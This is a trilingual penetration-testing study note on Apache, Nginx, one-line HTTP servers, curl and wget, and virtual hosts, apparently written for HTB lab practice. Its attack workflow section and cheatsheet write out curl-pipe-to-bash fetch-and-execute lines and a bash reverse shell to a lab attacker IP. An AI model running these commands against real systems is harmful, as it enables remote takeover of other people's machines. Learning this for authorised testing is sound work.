## 1. 🏛️ Apache Web Server — Enterprise HTTP Daemon

### 🇮🇩 Bahasa Indonesia
**Apache HTTP Server** (`apache2`) adalah salah satu web server paling populer di dunia Linux. Pada distribusi berbasis Debian/Ubuntu:
- **Direktori Web Root**: `/var/www/html/` (tempat file web publik seperti `index.html` dan `index.php` disimpan).
- **Direktori Konfigurasi**: `/etc/apache2/`
- **File Konfigurasi Utama**: `/etc/apache2/apache2.conf`
- **Konfigurasi Port**: `/etc/apache2/ports.conf` (menentukan port listening, default `80` dan `443`).
- **Situs Aktif**: `/etc/apache2/sites-available/` dan `/etc/apache2/sites-enabled/`.

### 🇬🇧 English
**Apache HTTP Server** (`apache2`) is a battle-tested web server powering enterprise Linux environments. On Debian/Ubuntu systems:
- **Default Document Root**: `/var/www/html/` (where public web assets and scripts reside).
- **Configuration Directory**: `/etc/apache2/`
- **Primary Configuration**: `/etc/apache2/apache2.conf`
- **Port Bindings**: `/etc/apache2/ports.conf` (defines listening ports, default `80` and `443`).
- **Virtual Host Profiles**: `/etc/apache2/sites-available/` and `/etc/apache2/sites-enabled/`.

### 🇯🇵 日本語
**Apache HTTP Server**（`apache2`）は、Linuxで広く使用されているWebサーバーです。Debian/Ubuntu系ディストリビューションでは：
- **ドキュメントルート**: `/var/www/html/`（公開するHTMLやPHPファイルを配置）。
- **設定ディレクトリ**: `/etc/apache2/`
- **メイン設定ファイル**: `/etc/apache2/apache2.conf`
- **ポート設定**: `/etc/apache2/ports.conf`（リッスンポート、デフォルトは80/443）。
- **サイト設定**: `/etc/apache2/sites-available/` および `/etc/apache2/sites-enabled/`。

```bash
# ── APACHE SERVICE MANAGEMENT ────────────────────────────────
$ sudo apt install apache2 -y

# Start, check status, and enable at boot
$ sudo systemctl start apache2
$ sudo systemctl enable apache2
$ systemctl status apache2

# Enable site configuration and rewrite module
$ sudo a2ensite 000-default.conf
$ sudo a2enmod rewrite
$ sudo systemctl reload apache2
```

## 2. ⚡ Nginx Web Server — High-Performance Reverse Proxy

### 🇮🇩 Bahasa Indonesia
**Nginx** (Engine-X) adalah web server modern dan reverse proxy berbasis event-driven asynchronous yang sangat efisien dalam menangani traffic tinggi:
- **Konfigurasi Utama**: `/etc/nginx/nginx.conf`
- **Server Blocks / Virtual Hosts**: `/etc/nginx/sites-available/` dan `/etc/nginx/sites-enabled/`
- **Log Akses & Error**: `/var/log/nginx/access.log` dan `/var/log/nginx/error.log`

### 🇬🇧 English
**Nginx** is a high-concurrency, asynchronous, event-driven web server and reverse proxy:
- **Core Configuration**: `/etc/nginx/nginx.conf`
- **Server Blocks**: `/etc/nginx/sites-available/` linked to `/etc/nginx/sites-enabled/`
- **Access & Error Logging**: `/var/log/nginx/access.log` and `/var/log/nginx/error.log`

### 🇯🇵 日本語
**Nginx**は、イベント駆動型の非同期アーキテクチャを採用した高性能Webサーバー兼リバースプロキシです：
- **メイン設定**: `/etc/nginx/nginx.conf`
- **サーバーブロック**: `/etc/nginx/sites-available/` と `/etc/nginx/sites-enabled/`
- **ログファイル**: `/var/log/nginx/access.log` および `error.log`

```bash
# ── NGINX SERVICE MANAGEMENT ─────────────────────────────────
$ sudo apt install nginx -y
$ sudo systemctl start nginx
$ sudo systemctl status nginx

# Test configuration syntax before reloading
$ sudo nginx -t
nginx: the configuration file /etc/nginx/nginx.conf syntax is ok
nginx: configuration file /etc/nginx/nginx.conf test is successful

$ sudo systemctl reload nginx
```

## 3. 🚀 Lightweight HTTP Servers — Rapid Prototyping & Payload Hosting

### 🇮🇩 Bahasa Indonesia
Dalam praktiknya, pentester dan administrator sering kali tidak membutuhkan web server kompleks hanya untuk mentransfer file atau menguji endpoint. Linux menyediakan server HTTP ringan sekali jalan (*one-liner HTTP servers*):
- **Python 3**: `python3 -m http.server <port>` (server bawaan Python paling populer).
- **PHP**: `php -S 0.0.0.0:<port>` (mendukung eksekusi skrip `.php` lokal).
- **Node.js**: `npx http-server -p <port>`
- **Ruby**: `ruby -run -ehttpd . -p <port>`

### 🇬🇧 English
In penetration testing and rapid development, spinning up full daemons like Apache is unnecessary for temporary asset transfer. Linux accommodates instant one-liner HTTP servers:
- **Python 3**: `python3 -m http.server <port>` (standard utility for ad-hoc file hosting).
- **PHP**: `php -S 0.0.0.0:<port>` (executes local PHP scripts on the fly).
- **Node.js**: `npx http-server -p <port>`
- **Ruby**: `ruby -run -ehttpd . -p <port>`

### 🇯🇵 日本語
ペネトレーションテストやファイル転送において、Apacheのような完全なデーモンを常駐させる必要がない場合、軽量なワンライナーWebサーバーが極めて有用です：
- **Python 3**: `python3 -m http.server 8000`（最も広く利用される即席サーバー）。
- **PHP**: `php -S 0.0.0.0:8000`（ローカルのPHPコードを実行可能）。
- **Node.js**: `npx http-server -p 8080`
- **Ruby**: `ruby -run -ehttpd . -p 8080`

```bash
# ── INSTANT FILE HOSTING ONE-LINERS ──────────────────────────
# Host current directory on port 8000 (accessible on all interfaces)
$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

# Host using PHP on port 8080
$ php -S 0.0.0.0:8080

# Host with custom root directory in Python
$ python3 -m http.server 8080 --directory /tmp/payloads/
```

## 4. 📟 Terminal Web Clients — Interacting with `curl` & `wget`

### 🇮🇩 Bahasa Indonesia
- `curl`: Tool serbaguna untuk mengirim berbagai jenis HTTP request (GET, POST, PUT, DELETE), membaca header respons (`-i` / `-I`), dan proxying (`-x`).
- `wget`: Tool khusus untuk mengunduh file besar, mendukung unduhan rekursif (`-r`) dan kelanjutan unduhan terputus (`-c`).

### 🇬🇧 English
- `curl`: Versatile client for crafting raw HTTP requests (GET, POST, PUT, DELETE), inspecting headers (`-i` / `-I`), and proxying through interceptors (`-x`).
- `wget`: Dedicated background downloader supporting recursive web mirroring (`-r`) and resumable transfers (`-c`).

### 🇯🇵 日本語
- `curl`: HTTPリクエスト（GET、POST、PUT等）の送信、ヘッダー検査（`-i` / `-I`）、プロキシ設定（`-x`）が可能な汎用ツール。
- `wget`: ファイルダウンロード専用ツール。再帰的ダウンロード（`-r`）や中断後の再開（`-c`）に対応。

```bash
# ── INTERACTING FROM TERMINAL ────────────────────────────────
# Fetch response headers only
$ curl -I http://127.0.0.1:8000/

# Download a remote file with wget
$ wget http://10.10.14.5:8000/linpeas.sh -O /tmp/linpeas.sh

# Download and execute in memory
$ curl -s http://10.10.14.5:8000/recon.sh | bash
```

## 5. 🏷️ Virtual Hosts (vHosts) — Hosting Multiple Domains

### 🇮🇩 Bahasa Indonesia
**Virtual Hosting** memungkinkan satu web server (satu alamat IP) untuk menjalankan banyak website dengan nama domain berbeda (misal `app.target.htb` dan `admin.target.htb`).
- Web server menentukan website mana yang dipanggil berdasarkan header **`Host:`** yang dikirim klien.
- Pada mesin pengujian / lab CTF, kita menambahkan entri ke `/etc/hosts` agar domain lokal tersebut mengarah ke IP target.

### 🇬🇧 English
**Virtual Hosting** empowers a single web server instance and IP address to serve multiple distinct domains (e.g., `portal.target.htb` and `internal.target.htb`).
- The web server parses the HTTP **`Host:`** request header to route requests to the designated document root.
- In security testing and lab environments, `/etc/hosts` mapping resolves local virtual hostnames to target IPs.

### 🇯🇵 日本語
**バーチャルホスト（Virtual Hosts）** は、単一のWebサーバー（1つのIP）で複数の異なるドメイン名（`site1.htb` や `admin.htb`）をホストする技術です：
- Webサーバーはクライアントが送信した **`Host:`** ヘッダーを参照してルーティングを行います。
- ペネトレーションテストでは、`/etc/hosts` にレコードを追加して対象ドメインを解決します。

```bash
# ── MAPPING VIRTUAL HOSTS LOCALLY ────────────────────────────
$ sudo tee -a /etc/hosts << EOF
10.129.42.100 target.htb
10.129.42.100 dev.target.htb
10.129.42.100 admin.target.htb
EOF

# Test specific virtual host routing with curl
$ curl -H "Host: admin.target.htb" http://10.129.42.100/
```

## 6. 🔐 Security Note — Payload Delivery, Web Roots & Common Misconfigurations

### 🇮🇩 Bahasa Indonesia
Dalam penetration testing (*HTB Academy Module 18* & *The Web Application Hacker's Handbook*):
1. **Payload Delivery Channel**: Penyerang memanfaatkan `python3 -m http.server 80` pada mesin serang (Kali/Parrot) untuk menyajikan malware, reverse shell, atau tool enumerasi (*linpeas.sh*, *mimikatz*) dan menariknya ke target korban menggunakan `curl` atau `wget`.
2. **Directory Listing / Indexing**: Jika direktori tidak memiliki file `index.html` dan direktif `Options +Indexes` aktif di Apache, server akan menampilkan seluruh daftar file secara publik, memaparkan file backup (`backup.zip`, `.env`, `.sql`).
3. **Misconfigured Web Root Permissions**: Memberikan permission `chmod -R 777 /var/www/html/` memungkinkan proses non-root atau penyerang dengan low-priv shell menulis file `.php` backdoor langsung ke web root.
4. **Information Disclosure**: File informasi default seperti `phpinfo.php` membocorkan versi PHP, path direktori absolut, dan variabel lingkungan server.

### 🇬🇧 English
In penetration testing methodology (*HTB Academy Module 18* & *The Web Application Hacker's Handbook*):
1. **Payload Staging & Delivery**: Attackers execute `python3 -m http.server 80` on their host to stage privilege escalation binaries or reverse shells, ingesting them onto the target machine via `curl -s http://<IP>/shell.sh | bash`.
2. **Directory Indexing Vulnerabilities**: When `index.html` is absent and `Options +Indexes` remains enabled in Apache, web servers emit directory trees exposing forgotten database dumps (`.sql`), source backups (`.zip`), and `.env` credentials.
3. **Excessive Web Root Permissions**: Executing `chmod -R 777 /var/www/html/` allows low-privilege system accounts to plant persistent PHP web shells into publicly reachable directories.
4. **Default Telemetry Endpoints**: Unprotected `phpinfo.php` or `server-status` pages reveal server internals, loaded modules, and private environment secrets.

### 🇯🇵 日本語
ペネトレーションテスト（HTB Academy Module 18）におけるWebサーバー関連の攻撃・防御の要点：
1. **ペイロード配信サーバーの構築**: 攻撃者は攻撃端末上で `python3 -m http.server 80` を立ち上げ、標的マシンから `wget` や `curl` を使って権限昇格スクリプト（*linpeas.sh* 等）を迅速に送り込みます。
2. **ディレクトリリスティング（Directory Indexing）の放置**: `Options +Indexes` が有効で `index.html` が存在しない場合、ディレクトリ内の全ファイル（バックアップ `.zip`、`.env`、SQLダンプ）が外部に公開されてしまいます。
3. **Webルートの過剰な書き込み権限**: `/var/www/html` に `777` 権限が付与されていると、一般ユーザー権限の侵害から直ちにWebシェル（バックドア）の設置を許す原因となります。
4. **機密情報の露出**: `phpinfo.php` や `/server-status` の放置によるシステム内部構成の漏洩。

```bash
# ── ATTACK WORKFLOW: PAYLOAD STAGING & EXECUTION ─────────────
# Step 1 (Attacker Kali): Stage reverse shell payload
$ echo 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1' > /tmp/payloads/rev.sh
$ cd /tmp/payloads && python3 -m http.server 80

# Step 2 (Victim Target): Ingest and execute payload
$ curl http://10.10.14.5/rev.sh | bash
```

## 7. 🧠 Quick Reference Cheatsheet

```bash
# ── SERVICE COMMANDS ─────────────────────────────────────────
sudo systemctl start apache2             # start Apache
sudo systemctl restart apache2           # restart Apache
sudo systemctl start nginx               # start Nginx
sudo nginx -t                            # test Nginx config syntax

# ── INSTANT WEBSERVERS (PENTESTING) ──────────────────────────
python3 -m http.server 80                # Python3 HTTP server on port 80
php -S 0.0.0.0:8000                      # PHP built-in server
python3 -m http.server 8080 -d /path/dir # host specific directory

# ── TERMINAL INTERACTION ─────────────────────────────────────
curl -I http://target.htb/               # inspect headers only
curl -v http://target.htb/               # full request/response flow
wget http://target.htb/file.zip          # download file
curl -s http://target.htb/script.sh | bash # download & execute

# ── VHOST TESTING ────────────────────────────────────────────
curl -H "Host: vhost.target.htb" http://10.10.10.10/
```
